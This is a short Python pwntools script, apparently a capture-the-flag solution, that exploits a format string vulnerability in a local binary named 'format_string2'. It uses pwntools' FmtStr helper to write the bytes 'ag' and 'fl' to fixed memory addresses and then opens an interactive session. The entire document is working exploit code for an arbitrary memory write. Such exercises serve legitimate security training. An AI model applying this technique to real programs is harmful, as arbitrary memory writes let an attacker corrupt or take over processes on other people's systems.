#!/usr/bin/python3
from pwn import *

p = process('./format_string2')

def send_payload(payload):
    p.sendline(payload)
    return p.recv()

format_string = FmtStr(execute_fmt=send_payload)
format_string.write(0x6761, 0x404060)
format_string.write(0x6c66, 0x404062)
format_string.execute_writes()

p.interactive()
